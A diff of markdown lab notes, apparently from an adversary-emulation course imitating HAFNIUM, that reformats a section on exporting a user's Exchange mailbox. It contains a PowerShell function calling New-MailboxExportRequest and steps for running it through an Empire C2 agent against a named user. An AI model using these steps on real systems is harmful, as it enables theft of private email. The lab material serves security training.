@@ -60,7 +60,7 @@ powershell -c "Add-PSSnapIn Microsoft.Exchange.Management.Powershell.SnapIn; Get
 ```
 ![[Pasted image 20240324033515.png]]
 ### Export User Emails
-Goal: The PS script will leverage Exchange SnapIn, sets an output file and then exports the user's email to a PST file. 
+*Goal:* The PS script will leverage Exchange SnapIn, sets an output file and then exports the user's email to a PST file. 
 - Create the file on Slingshot Linux at `/labs/sec-3/initial-access/export-email.ps1`
 - Note: These commands need to run as a script because there are some inconsistencies with stating UNC paths
 ```powershell
@@ -73,14 +73,17 @@ function Export-Email {
     New-MailboxExportRequest -Mailbox $User -FilePath $OutFile;
 };
 ```
-We will invoke this script with an Empire module called *invoke_script*. Interact with your agent, select `powershell/management/invoke_script` from the Execute Module drop down list. Then enter the following values:
+We will invoke this script with an Empire module called *invoke_script*. 
+- Interact with your agent, select `powershell/management/invoke_script` from the Execute Module drop down list.
+- Then enter the following values:
 
-    ScriptCmd: Export-Email Mark.Goodwin
-    ScriptPath: /labs/sec-3/initial-access/export-email.ps1
+	    ScriptCmd: Export-Email Mark.Goodwin
+	    ScriptPath: /labs/sec-3/initial-access/export-email.ps1
 
 ![[Pasted image 20240324033656.png]]
 
 - There are many ways to complete a task but these commands mimic the same techniques used by HAFNIUM, the adversary we are emulating.
+
 ### Read User Emails
 
 
